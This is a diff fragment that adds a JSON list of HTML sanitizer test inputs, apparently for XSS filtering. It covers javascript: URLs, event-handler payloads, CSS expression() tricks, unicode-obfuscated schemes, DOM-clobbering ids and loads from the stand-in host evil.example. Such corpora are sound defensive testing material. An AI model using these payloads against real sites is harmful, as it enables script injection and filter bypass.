+  "input": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
+ },
+ {
+  "id": "frame-and-form-200",
+  "category": "frame-and-form",
+  "input": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">"
+ },
+ {
+  "id": "frame-and-form-201",
+  "category": "frame-and-form",
+  "input": "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src *\">"
+ },
+ {
+  "id": "frame-and-form-202",
+  "category": "frame-and-form",
+  "input": "<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">"
+ },
+ {
+  "id": "frame-and-form-203",
+  "category": "frame-and-form",
+  "input": "<link rel=\"import\" href=\"https://evil.example/x.html\">"
+ },
+ {
+  "id": "frame-and-form-204",
+  "category": "frame-and-form",
+  "input": "<frameset><frame src=\"https://evil.example/\"></frameset>"
+ },
+ {
+  "id": "frame-and-form-205",
+  "category": "frame-and-form",
+  "input": "<video><source onerror=alert(1)></video>"
+ },
+ {
+  "id": "frame-and-form-206",
+  "category": "frame-and-form",
+  "input": "<video src=x onerror=alert(1)></video>"
+ },
+ {
+  "id": "frame-and-form-207",
+  "category": "frame-and-form",
+  "input": "<audio src=x onerror=alert(1)></audio>"
+ },
+ {
+  "id": "frame-and-form-208",
+  "category": "frame-and-form",
+  "input": "<video poster=\"javascript:alert(1)\"></video>"
+ },
+ {
+  "id": "frame-and-form-209",
+  "category": "frame-and-form",
+  "input": "<img srcset=\"x 1x, javascript:alert(1) 2x\">"
+ },
+ {
+  "id": "frame-and-form-210",
+  "category": "frame-and-form",
+  "input": "<picture><source srcset=\"javascript:alert(1)\"><img src=x></picture>"
+ },
+ {
+  "id": "frame-and-form-211",
+  "category": "frame-and-form",
+  "input": "<isindex action=\"javascript:alert(1)\" type=image>"
+ },
+ {
+  "id": "frame-and-form-212",
+  "category": "frame-and-form",
+  "input": "<details open ontoggle=alert(1)>x</details>"
+ },
+ {
+  "id": "frame-and-form-213",
+  "category": "frame-and-form",
+  "input": "<a href=\"https://te.example\" ping=\"https://evil.example/p\">x</a>"
+ },
+ {
+  "id": "css-214",
+  "category": "css",
+  "input": "<p style=\"background:url(javascript:alert(1))\">x</p>"
+ },
+ {
+  "id": "css-215",
+  "category": "css",
+  "input": "<p style=\"background-image:url(https://evil.example/x.png)\">x</p>"
+ },
+ {
+  "id": "css-216",
+  "category": "css",
+  "input": "<p style=\"width:expression(alert(1))\">x</p>"
+ },
+ {
+  "id": "css-217",
+  "category": "css",
+  "input": "<p style=\"color:expression(alert(1))\">x</p>"
+ },
+ {
+  "id": "css-218",
+  "category": "css",
+  "input": "<p style=\"position:fixed;top:0;left:0;width:100%;height:100%\">x</p>"
+ },
+ {
+  "id": "css-219",
+  "category": "css",
+  "input": "<p style=\"position:absolute;z-index:9999\">x</p>"
+ },
+ {
+  "id": "css-220",
+  "category": "css",
+  "input": "<p style=\"behavior:url(x.htc)\">x</p>"
+ },
+ {
+  "id": "css-221",
+  "category": "css",
+  "input": "<p style=\"-moz-binding:url(x.xml#a)\">x</p>"
+ },
+ {
+  "id": "css-222",
+  "category": "css",
+  "input": "<p style=\"color:red;background:url(x)\">x</p>"
+ },
+ {
+  "id": "css-223",
+  "category": "css",
+  "input": "<p style=\"@import 'https://evil.example/x.css'\">x</p>"
+ },
+ {
+  "id": "css-224",
+  "category": "css",
+  "input": "<p style=\"color:\\72 ed\">x</p>"
+ },
+ {
+  "id": "css-225",
+  "category": "css",
+  "input": "<p style=\"c\\6flor:red\">x</p>"
+ },
+ {
+  "id": "css-226",
+  "category": "css",
+  "input": "<p style=\"color:red/*;*/;position:fixed\">x</p>"
+ },
+ {
+  "id": "css-227",
+  "category": "css",
+  "input": "<p style=\"color:red;;;position:fixed\">x</p>"
+ },
+ {
+  "id": "css-228",
+  "category": "css",
+  "input": "<p style=\"COLOR:RED;POSITION:FIXED\">x</p>"
+ },
+ {
+  "id": "css-229",
+  "category": "css",
+  "input": "<p style=\"background:&#117;rl(javascript:alert(1))\">x</p>"
+ },
+ {
+  "id": "css-230",
+  "category": "css",
+  "input": "<p style=\"background:u\\72l(javascript:alert(1))\">x</p>"
+ },
+ {
+  "id": "css-231",
+  "category": "css",
+  "input": "<p style=\"list-style:url(javascript:alert(1))\">x</p>"
+ },
+ {
+  "id": "css-232",
+  "category": "css",
+  "input": "<p style=\"cursor:url(https://evil.example/c.cur),auto\">x</p>"
+ },
+ {
+  "id": "css-233",
+  "category": "css",
+  "input": "<p style=\"font-family:x;}</style><script>alert(1)</script>\">x</p>"
+ },
+ {
+  "id": "css-234",
+  "category": "css",
+  "input": "<p style=\"color:red}body{background:url(x)\">x</p>"
+ },
+ {
+  "id": "css-235",
+  "category": "css",
+  "input": "<p style=\"margin:-9999px;padding:url(x)\">x</p>"
+ },
+ {
+  "id": "css-236",
+  "category": "css",
+  "input": "<p style=\"font-size:expression(alert(1))\">x</p>"
+ },
+ {
+  "id": "css-237",
+  "category": "css",
+  "input": "<p style=\"text-decoration:url(x)\">x</p>"
+ },
+ {
+  "id": "css-238",
+  "category": "css",
+  "input": "<p style=\"filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='x')\">x</p>"
+ },
+ {
+  "id": "css-239",
+  "category": "css",
+  "input": "<p style=\"animation-name:x;animation-duration:1s\">x</p>"
+ },
+ {
+  "id": "css-240",
+  "category": "css",
+  "input": "<p style=\"display:none\">x</p>"
+ },
+ {
+  "id": "css-241",
+  "category": "css",
+  "input": "<p style=\"color:red !important;position:fixed !important\">x</p>"
+ },
+ {
+  "id": "css-242",
+  "category": "css",
+  "input": "<td style=\"background-color:#fff;color:#000;text-align:center\">x</td>"
+ },
+ {
+  "id": "unicode-243",
+  "category": "unicode",
+  "input": "<a href=\"ｊavascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "unicode-244",
+  "category": "unicode",
+  "input": "<a href=\"ｊａｖａｓｃｒｉｐｔ:alert(1)\">x</a>"
+ },
+ {
+  "id": "unicode-245",
+  "category": "unicode",
+  "input": "<a href=\"java‍script:alert(1)\">x</a>"
+ },
+ {
+  "id": "unicode-246",
+  "category": "unicode",
+  "input": "<a href=\"java⁠script:alert(1)\">x</a>"
+ },
+ {
+  "id": "unicode-247",
+  "category": "unicode",
+  "input": "<a href=\"java­script:alert(1)\">x</a>"
+ },
+ {
+  "id": "unicode-248",
+  "category": "unicode",
+  "input": "<a href=\"javascriıpt:alert(1)\">x</a>"
+ },
+ {
+  "id": "unicode-249",
+  "category": "unicode",
+  "input": "<a href=\"JAVAſCRIPT:alert(1)\">x</a>"
+ },
+ {
+  "id": "unicode-250",
+  "category": "unicode",
+  "input": "<a href=\"javascript：alert(1)\">x</a>"
+ },
+ {
+  "id": "unicode-251",
+  "category": "unicode",
+  "input": "<scrıpt>alert(1)</scrıpt>"
+ },
+ {
+  "id": "unicode-252",
+  "category": "unicode",
+  "input": "<＜script＞alert(1)＜/script＞"
+ },
+ {
+  "id": "unicode-253",
+  "category": "unicode",
+  "input": "＜script＞alert(1)＜/script＞"
+ },
+ {
+  "id": "unicode-254",
+  "category": "unicode",
+  "input": "<p>‮<script>alert(1)</script></p>"
+ },
+ {
+  "id": "unicode-255",
+  "category": "unicode",
+  "input": "<img src=x onerr​or=alert(1)>"
+ },
+ {
+  "id": "unicode-256",
+  "category": "unicode",
+  "input": "<p>\u0000<script>alert(1)</script></p>"
+ },
+ {
+  "id": "unicode-257",
+  "category": "unicode",
+  "input": "<p>￾<img src=x onerror=alert(1)></p>"
+ },
+ {
+  "id": "unicode-258",
+  "category": "unicode",
+  "input": "<ScRiPt>alert(1)</sCrIpT>"
+ },
+ {
+  "id": "unicode-259",
+  "category": "unicode",
+  "input": "<SCRIPT>alert(1)</SCRIPT>"
+ },
+ {
+  "id": "unicode-260",
+  "category": "unicode",
+  "input": "<p>café über 中文 да</p>"
+ },
+ {
+  "id": "unicode-261",
+  "category": "unicode",
+  "input": "<p>emoji 😀 text</p>"
+ },
+ {
+  "id": "unicode-262",
+  "category": "unicode",
+  "input": "<p title=\"\" onmouseover=alert(1)\">x</p>"
+ },
+ {
+  "id": "unicode-263",
+  "category": "unicode",
+  "input": "<a href=\"https://te.example/‮js.exe\">x</a>"
+ },
+ {
+  "id": "event-and-clobber-264",
+  "category": "event-and-clobber",
+  "input": "<p onclick=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-265",
+  "category": "event-and-clobber",
+  "input": "<p ondblclick=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-266",
+  "category": "event-and-clobber",
+  "input": "<p onmouseover=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-267",
+  "category": "event-and-clobber",
+  "input": "<p onmouseout=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-268",
+  "category": "event-and-clobber",
+  "input": "<p onmousedown=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-269",
+  "category": "event-and-clobber",
+  "input": "<p onmouseup=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-270",
+  "category": "event-and-clobber",
+  "input": "<p onmousemove=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-271",
+  "category": "event-and-clobber",
+  "input": "<p onfocus=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-272",
+  "category": "event-and-clobber",
+  "input": "<p onblur=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-273",
+  "category": "event-and-clobber",
+  "input": "<p onerror=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-274",
+  "category": "event-and-clobber",
+  "input": "<p onload=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-275",
+  "category": "event-and-clobber",
+  "input": "<p onunload=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-276",
+  "category": "event-and-clobber",
+  "input": "<p onchange=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-277",
+  "category": "event-and-clobber",
+  "input": "<p onsubmit=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-278",
+  "category": "event-and-clobber",
+  "input": "<p onkeydown=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-279",
+  "category": "event-and-clobber",
+  "input": "<p onkeyup=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-280",
+  "category": "event-and-clobber",
+  "input": "<p onkeypress=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-281",
+  "category": "event-and-clobber",
+  "input": "<p ontoggle=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-282",
+  "category": "event-and-clobber",
+  "input": "<p onanimationstart=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-283",
+  "category": "event-and-clobber",
+  "input": "<p onanimationend=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-284",
+  "category": "event-and-clobber",
+  "input": "<p ontransitionend=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-285",
+  "category": "event-and-clobber",
+  "input": "<p onpointerover=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-286",
+  "category": "event-and-clobber",
+  "input": "<p onpointerdown=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-287",
+  "category": "event-and-clobber",
+  "input": "<p onwheel=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-288",
+  "category": "event-and-clobber",
+  "input": "<p onscroll=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-289",
+  "category": "event-and-clobber",
+  "input": "<p onpaste=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-290",
+  "category": "event-and-clobber",
+  "input": "<p oncopy=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-291",
+  "category": "event-and-clobber",
+  "input": "<p oninput=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-292",
+  "category": "event-and-clobber",
+  "input": "<p onbeforeinput=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-293",
+  "category": "event-and-clobber",
+  "input": "<p ondrag=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-294",
+  "category": "event-and-clobber",
+  "input": "<p ondrop=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-295",
+  "category": "event-and-clobber",
+  "input": "<p onauxclick=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-296",
+  "category": "event-and-clobber",
+  "input": "<p oncontextmenu=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-297",
+  "category": "event-and-clobber",
+  "input": "<p onresize=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-298",
+  "category": "event-and-clobber",
+  "input": "<p onhashchange=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-299",
+  "category": "event-and-clobber",
+  "input": "<p onpageshow=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-300",
+  "category": "event-and-clobber",
+  "input": "<p onbegin=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-301",
+  "category": "event-and-clobber",
+  "input": "<p onreadystatechange=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-302",
+  "category": "event-and-clobber",
+  "input": "<p onformdata=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-303",
+  "category": "event-and-clobber",
+  "input": "<p oncut=\"alert(1)\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-304",
+  "category": "event-and-clobber",
+  "input": "<p id=\"x\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-305",
+  "category": "event-and-clobber",
+  "input": "<a name=\"cookie\">x</a>"
+ },
+ {
+  "id": "event-and-clobber-306",
+  "category": "event-and-clobber",
+  "input": "<form id=\"x\"><input name=\"attributes\"></form>"
+ },
+ {
+  "id": "event-and-clobber-307",
+  "category": "event-and-clobber",
+  "input": "<img name=\"getElementById\" src=x>"
+ },
+ {
+  "id": "event-and-clobber-308",
+  "category": "event-and-clobber",
+  "input": "<img id=\"documentElement\" src=x>"
+ },
+ {
+  "id": "event-and-clobber-309",
+  "category": "event-and-clobber",
+  "input": "<a id=\"defaultView\"></a><a id=\"defaultView\" name=\"alert\" href=\"x:1\"></a>"
+ },
+ {
+  "id": "event-and-clobber-310",
+  "category": "event-and-clobber",
+  "input": "<p class=\"x\" id=\"y\" name=\"z\" title=\"t\">x</p>"
+ },
+ {
+  "id": "event-and-clobber-311",
+  "category": "event-and-clobber",
+  "input": "<div id=\"__proto__\">x</div>"
+ },
+ {
+  "id": "event-and-clobber-312",
+  "category": "event-and-clobber",
+  "input": "<img src=x ID=body>"
+ },
+ {
+  "id": "event-and-clobber-313",
+  "category": "event-and-clobber",
+  "input": "<div id=constructor>x</div>"
+ }
+]
